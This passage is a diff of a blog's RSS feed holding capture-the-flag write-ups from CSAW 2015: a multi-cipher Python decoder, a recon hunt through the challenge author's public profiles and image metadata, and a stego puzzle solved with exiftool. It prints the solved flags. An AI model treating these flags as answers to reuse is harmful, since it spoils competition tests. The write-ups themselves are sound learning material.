ZuTVZsaVRsaG5XbFp1TldOV1IzZGtWRzlaWTFGeFJscGxWRVo1Vkc1YVpHWXhXblpYY0dGVFpERnpXRlp1WnpCa01WVjZUVlZXYkZKVk5WZFVWelZ5VjBaU2RsZHZjMjlsUlRVd1dWVmFUMVl5U2tsUmNEbFlaVVp6ZVZWdFNrcG9WbEo0Vkc5YWJHVlhhMk5XVnpWNlZtNHhSMVp4VGxobFdGSjFXVzVhWkZZeGIzVlhiamxXVFc1elYxWXlOVWRXTVVwWFYxUkNWazF4YTB4V2NERlRVMVpuZDJoR1VsTldjVUpKVm05bU1XY3hVV0ZTY1VwT1UwZHJkRlZ3WVhwWlZsSldaRWM1VlZKeFFsZFpWV3RQVjBaS2RXWkZaMXBXVmxWaFZtNWFUMUp2VG5aWGIxWnNVbkZDVVZaWGMwSm9SMUpJVlc1YWExSXpRbk5aYjJkdVRrWmFWMWR2WjFOTlZuTllWbTlyY2xkSFJXSmtSbFpWVm05VllWWndZV1JTTVc1alpFWm5VMlZXU2t0V1ZFb3daekZhZFUxVmExWmtNbUZXVm05YVpGZEdXV0pvUlRsVFZtNWFNVmxWV21Sa1JURlpVVzlTV0dWR2MxUldSRVpMWjBaV1dWcEdUbXROY0d0VlYxWm5NRk14VFdGYVJtZFhWMGRyV0Zad01UQk9SbGxpVFZWblYxSXdjMWxXUjNOUFZuQktSMlpGWVZWbFJuTXpXVEl4UzFJeFduWlhialZUVFRKclVWWnVXbE5SY0ZaSFYzRk9WV1F4YzNKVmNHRkxWa1pTVm1SSE9WVlNjVUpYVmxkM2JsWkhSalpTYm1kYVpERnphMVpVUmt0WFIxWkZWVzluYTJRd2N6RlhibEpIVm5CV1YxZHhTbGhsUmtwVVZGZGhTMmN4V2xWUmNIZFRUVzlHTlZWd05VdFhSMHBIWmtaT1YyUXhjMnRWTUZwWFRtOU9kVTlXVW14U1dFSmtWMVpXYlUxV1dXSlRjVXBUWkc0MVYxUldaMU5UUm5ORlVuQkdWMlZGYzFwWk1GcFhWakZLVmxkWWMxZFNjRkY2Vm0xR1QyWXhXbGxrUjBaVVVqRktWbFp3YzBKTlZrNUhWMjVuV0dWRmMzWlZiMUpYVWpGU1ZtUklUbFpsUm5OSFZUSjNORmxXV25abVIydGFUWEZyVEZZeFowdFRSMDVIV2tVMVUxSldjMWRXYjJjMFdWWlJZV1ZHWjFWWFIyRldXVzlyVTFaR1duWmtSVXB2VW05Wk1sVlhOVXRrTURGMlYyOXJWMDF0Vm1OV2JsVmhVbTluZFZSdlowNWxiMFl6VjFabk5GVndVV0ZYY1VaWVpVaENUMWxVVGtOVGIxcFpaa1U1YlUxV2J6UldWMkZ1VlRKS1IxTnZaMXBXUlZvelZtNWFVMVp2Vm5WVWIxSlRaVVp6V1ZadVdsTlRNa1oyVTI5cmExSlViMWhaYjJ0VFpFWlZZVmR2VGxkTlZuTmlWMjVhYmxZeFdraGFNM05YVmpOQ1JGbGpSbTVTTWs1SlZIQnZUazF2U21GV1YzTlBVVEF3WVZkdlZsSmtNbEoxVm5CMk1WWXhibnBWYm1kc1VtNXpXRll5ZDNaV01VcEdaa2RyVmsxR1ZqUlZNV2RMVTBkS1NHVkZOVmRXUmxWNlZuQnpRMlJ1TVZkVVdHOVRWMGRTV1ZsWWMwZFdWbHAyV2tSU2JWSnZWalZhUldZMVZrZEtSMlZFVGxwa01tdFVWbTVhWkdadU5WWmtSbWRzVWpGS1RWZHVWbVJWTVVwM1UyNW5WV1ZYYTNKVVZWSlhVakZhVmxkdlNtNU5WVXBUVlVaUmVsQlJQVDA9'&lt;/span&gt;
 
-&lt;span class=&quot;n&quot;&gt;dec_ciphers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;rot13&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;b64d&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;caesard&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;dec_ciphers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'rot13'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'b64d'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'caesard'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
 
 &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rot13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
 	&lt;span class=&quot;n&quot;&gt;_rot13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;maketrans&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; 
@@ -1376,15 +1378,15 @@ After dissecting what this is, it is clearly python code in which some “flag�
 		&lt;span class=&quot;n&quot;&gt;cipher_index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
 		&lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dec_ciphers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cipher_index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
 		&lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;globals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t\n\r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;globals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t\n\r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
 	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt;
 
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
 	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ciph&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;Flag: flag{li0ns_and_tig3rs_4nd_b34rs_0h_mi}&lt;/p&gt;
 </description>
-        <pubDate>Sat, 19 Sep 2015 21:59:33 -0700</pubDate>
+        <pubDate>Sat, 19 Sep 2015 23:59:33 -0500</pubDate>
         <link>/blog/forensics/ctf/all/crypto/transfer</link>
         <guid isPermaLink="true">/blog/forensics/ctf/all/crypto/transfer</guid>
         
@@ -1419,7 +1421,7 @@ After dissecting what this is, it is clearly python code in which some “flag�
 
 &lt;p&gt;&lt;a href=&quot;http://fuzyll.com/csaw2015/start&quot;&gt;http://fuzyll.com/csaw2015/start&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/csaw/step1.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/csaw/step1.png&quot; alt=&quot;Start&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/csaw/step1.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/csaw/step1.png&quot; alt=&quot;Start&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;Upon entering link we are greeted with just a few lines of text:&lt;/p&gt;
 
@@ -1430,7 +1432,7 @@ After dissecting what this is, it is clearly python code in which some “flag�
 
 &lt;p&gt;I found his &lt;a href=&quot;https://www.linkedin.com/in/fuzyll&quot;&gt;LinkedIn&lt;/a&gt; by using the same domain as his website (https://www.linkedin.com/in/fuzyll). We can assume this his online handle.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/csaw/LinkedIn.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/csaw/LinkedIn.png&quot; alt=&quot;LinkedinScreen&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/csaw/LinkedIn.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/csaw/LinkedIn.png&quot; alt=&quot;LinkedinScreen&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;Upon checking his LinkedIn, we see he went to the University of South Florida.&lt;/p&gt;
 
@@ -1442,7 +1444,7 @@ Education: 	University of South Florida
 &lt;p&gt;After which we can google “University of south florida hacking club” which brings us to:&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&quot;http://www.wcsc.usf.edu/&quot;&gt;Whitehatters Computer Security Club&lt;/a&gt;
-&lt;a href=&quot;https://viviturtle.github.io/images/csaw/wcsc.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/csaw/wcsc.png&quot; alt=&quot;wcsc&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;a href=&quot;http://localhost:4000/images/csaw/wcsc.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/csaw/wcsc.png&quot; alt=&quot;wcsc&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;On this page we can clearly see the acronym: wcsc&lt;/p&gt;
 
@@ -1457,7 +1459,7 @@ Education: 	University of South Florida
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;I googled “Fuzyll Smash” and arrived at a few &lt;a href=&quot;https://www.youtube.com/watch?v=59QQ9UevSuE&quot;&gt;YouTube&lt;/a&gt; Pages.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/csaw/youtube.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/csaw/youtube.png&quot; alt=&quot;youtube&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/csaw/youtube.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/csaw/youtube.png&quot; alt=&quot;youtube&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;The answer here is from the title is Yoshi:&lt;/p&gt;
 
@@ -1466,7 +1468,7 @@ Education: 	University of South Florida
 
 &lt;p&gt;One step closer, we move on to the next page: &lt;a href=&quot;http://fuzyll.com/csaw2015/yoshi&quot;&gt;http://fuzyll.com/csaw2015/yoshi&lt;/a&gt;. We see a picture of yoshi here.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/csaw/yoshi.txt&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/csaw/yoshi.txt&quot; alt=&quot;Yoshi&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/csaw/yoshi.txt&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/csaw/yoshi.txt&quot; alt=&quot;Yoshi&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;Noticing we have a picture, a good step would probably be to look at the metadeta. After downloading the picture, you can either upload it to &lt;a href=&quot;http://regex.info/exif.cgi&quot;&gt;Jeffrey’s Exif viewer&lt;/a&gt; or run exiftool, a tool to look at metadeta for like everything.&lt;/p&gt;
 
@@ -1498,13 +1500,13 @@ Pixels Per Unit X               : 2835
 Pixels Per Unit Y               : 2835
 Pixel Units                     : Meters
 Modify Date                     : 2015:09:18 03:00:11
-Comment                         : CSAW 2015 FUZYLL RECON PART 3 OF ?: Isn&#39;t Yoshi the best?! The next egg in your hunt can be found at /csaw2015/&amp;lt;the cryptosystem I had to break in my first defcon qualifier&amp;gt;.
+Comment                         : CSAW 2015 FUZYLL RECON PART 3 OF ?: Isn't Yoshi the best?! The next egg in your hunt can be found at /csaw2015/&amp;lt;the cryptosystem I had to break in my first defcon qualifier&amp;gt;.
 Image Size                      : 500x537
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;Looking at the comment we need to find the cryptosystem he did in his first defcon.&lt;/p&gt;
 
-&lt;pre&gt;&lt;code&gt;Comment: CSAW 2015 FUZYLL RECON PART 3 OF ?: Isn&#39;t Yoshi the best?! The next egg in your hunt can be found at /csaw2015/&amp;lt;the cryptosystem I had to break in my first defcon qualifier&amp;gt;.
+&lt;pre&gt;&lt;code&gt;Comment: CSAW 2015 FUZYLL RECON PART 3 OF ?: Isn't Yoshi the best?! The next egg in your hunt can be found at /csaw2015/&amp;lt;the cryptosystem I had to break in my first defcon qualifier&amp;gt;.
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;From here I googled every iteration with words like fuzyll, decon, qualifier, cryptography, writeups, and cryptosystem, but nothing showed up.I then started to guess since they isn’t that many to guess with. Some examples include:&lt;/p&gt;
@@ -1519,7 +1521,7 @@ Image Size                      : 500x537
 
 &lt;p&gt;Enigma somehow worked. Going on to &lt;a href=&quot;http://fuzyll.com/csaw2015/enigma&quot;&gt;http://fuzyll.com/csaw2015/enigma&lt;/a&gt;. We are greeted with another text.&lt;/p&gt;
 
-&lt;pre&gt;&lt;code&gt; CSAW 2015 FUZYLL RECON PART 4 OF 5: Okay, okay. This isn&#39;t Engima, but the next location was &quot;encrypted&quot; with the JavaScript below: Pla$ja|p$wpkt$kj$}kqv$uqawp$mw&amp;gt;$+gwes6451+pla}[waa[ia[vkhhmj
+&lt;pre&gt;&lt;code&gt; CSAW 2015 FUZYLL RECON PART 4 OF 5: Okay, okay. This isn't Engima, but the next location was &quot;encrypted&quot; with the JavaScript below: Pla$ja|p$wpkt$kj$}kqv$uqawp$mw&amp;gt;$+gwes6451+pla}[waa[ia[vkhhmj
 		
 		var s = &quot;THIS IS THE INPUT&quot;
 		var c = &quot;&quot;
@@ -1533,7 +1535,7 @@ Image Size                      : 500x537
 
 &lt;p&gt;I modified the js to pretty much do the same exact thing, but with the string given.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/assets/csaw/javascript_decode.js&quot;&gt;javascript_decode.js&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/assets/csaw/javascript_decode.js&quot;&gt;javascript_decode.js&lt;/a&gt;&lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Pla$ja|p$wpkt$kj$}kqv$uqawp$mw&amp;gt;$+gwes6451+pla}[waa[ia[vkhhmj&quot;&lt;/span&gt;
 &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
@@ -1557,7 +1559,7 @@ Image Size                      : 500x537
 
 &lt;p&gt;flag{I_S3ARCH3D_HI6H_4ND_L0W_4ND_4LL_I_F0UND_W4S_TH1S_L0USY_FL4G}!&lt;/p&gt;
 </description>
-        <pubDate>Fri, 18 Sep 2015 22:59:33 -0700</pubDate>
+        <pubDate>Sat, 19 Sep 2015 00:59:33 -0500</pubDate>
         <link>/blog/recon/ctf/all/alexander-taylor</link>
         <guid isPermaLink="true">/blog/recon/ctf/all/alexander-taylor</guid>
         
@@ -1587,11 +1589,11 @@ Image Size                      : 500x537
 &lt;/blockquote&gt;
 
 &lt;blockquote&gt;
-  &lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/csaw/img.jpg&quot;&gt;img.jpg&lt;/a&gt;&lt;/p&gt;
+  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/csaw/img.jpg&quot;&gt;img.jpg&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 
 &lt;p&gt;This one had a super easy solution. First it gave us a jpg. 
-&lt;a href=&quot;https://viviturtle.github.io/images/csaw/img.jpg&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/csaw/img.jpg&quot; alt=&quot;img.jpg&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;a href=&quot;http://localhost:4000/images/csaw/img.jpg&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/csaw/img.jpg&quot; alt=&quot;img.jpg&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;First thing I always do is run strings&lt;/p&gt;
 
@@ -1642,14 +1644,16 @@ Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
 Image Size                      : 600x700
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;Looking at the copyright section
-&amp;gt;Copyright                       : h1d1ng_in_4lm0st_pla1n_sigh7&lt;/p&gt;
+&lt;p&gt;Looking at the copyright section&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Copyright                       : h1d1ng_in_4lm0st_pla1n_sigh7&lt;/p&gt;
+&lt;/blockquote&gt;
 
 &lt;p&gt;you get the flag.&lt;/p&gt;
 
 &lt;p&gt;h1d1ng_in_4lm0st_pla1n_sigh7&lt;/p&gt;
 </description>
-        <pubDate>Fri, 18 Sep 2015 21:59:33 -0700</pubDate>
+        <pubDate>Fri, 18 Sep 2015 23:59:33 -0500</pubDate>
         <link>/blog/ctf/stego/all/keep-calm-and-ctf</link>
         <guid isPermaLink="true">/blog/ctf/stego/all/keep-calm-and-ctf</guid>
         
